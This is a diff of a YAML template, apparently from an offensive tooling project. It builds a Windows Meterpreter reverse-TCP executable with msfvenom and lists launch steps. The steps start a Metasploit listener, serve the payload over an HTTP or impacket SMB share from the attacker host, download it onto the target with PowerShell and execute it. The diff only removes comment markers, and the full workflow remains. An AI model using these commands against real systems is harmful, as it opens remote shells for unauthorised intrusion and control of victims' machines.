@@ -54,19 +54,19 @@ output:
   command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
 
   launch_instructions: |
-    # Step 1: Start Metasploit listener
+    Step 1: Start Metasploit listener
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
 
-    # Step 2: Transfer payload to target
-    # Option A: HTTP server
+    Step 2: Transfer payload to target
+    Option A: HTTP server
     python3 -m http.server 8000
-    # Then on target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}"
+    Then on target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}"
 
-    # Option B: SMB share
+    Option B: SMB share
     impacket-smbserver share . -smb2support
-    # Then on target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+    Then on target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
 
-    # Step 3: Execute on target
+    Step 3: Execute on target
     {{ output_file }}
 
-    # Note: This is a staged payload - requires network connectivity to download full Meterpreter
+    Note: This is a staged payload - requires network connectivity to download full Meterpreter
